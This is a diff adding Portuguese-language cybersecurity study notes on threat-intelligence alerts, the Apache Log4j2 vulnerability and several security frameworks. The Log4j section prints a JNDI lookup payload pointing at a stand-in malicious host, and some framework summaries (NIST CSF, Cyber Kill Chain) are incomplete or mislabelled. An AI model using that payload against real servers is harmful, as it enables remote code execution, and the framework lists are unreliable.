@@ -130,3 +130,31 @@ Informações Threat Intelligence são: relevantes, acionáveis e contextuais
             7. Exfiltração: extrai os dados.
 
          2. MITRE ATT&CK: descreve uma série de técnicas de ataque e são listadas por categorias e também fornece uma linguagem para entender os ataques cibernéticos.
+
+   Alertas e avisos de ataques:
+
+      Boas práticas:
+         1. manter-se atualizado com as vulnerabilidades e ataques detectados recentemente.
+         2. revisar os relatórios de vulnerabilidade e exposições comuns (CVE).
+         3. consultar sites confiáveis de segurnça como o Cybersecurity and infrastructure security agency (CISA).
+         4. assinar serviços oferecidos por fornecedores de segurança.
+      
+      Alertas de ataques possuem:
+         1. narrativa do ataque, tendo sua linha do tempo e tecnologias afetadas.
+         2. lista de soluções para romper a sequência de ataques e ferramentas para caçar ameaças.
+         3. lista de recursos e pesquisas relacionadas.
+         Também aconselham equipes de segurança como detectar, responder, proteger ou se recuperar de ameaças.
+         Ajuda as organizações a identificar lacunas e pontos fracos de segurança nas defesas da rede.
+
+      Vulnerabilidade do Apache Log4j2
+         Divulgada em dezembro de 2021, permite que um invasor execute código remotamente em servidores afetados, explorando a função de log via JNDI. É uma falha crítica, amplamente explorada, e a correção envolve atualizar o Log4j2 para a versão 2.17.1 ou superior.
+         A vulnerabilidade explora a funcionalidade de lookup de variáveis do Log4j, permitindo que um atacante envie uma string especialmente criada (como 
+         ${jndi:ldap://malicious.com/exploit}) que, quando registrada pelo Log4j, faz com que a aplicação busque e execute código malicioso via JNDI (Java Naming and Directory Interface).
+         Pode permitir que um invasor execute código remotamente em servidores afetados, levando a roubo de dados, controle total do sistema ou disseminação de malware.
+
+      Estrutura de segurança cibernética (CSF) do NIST: proteger, detectar, responder e identificar.
+
+      Cyber Kill Chain é dividido, como:
+            Proteger: reconhecimento, armamentização, entrega e exploração.
+
+      Estrutura de resposta a incidentes do NIST: detectar, responder e recuperar.
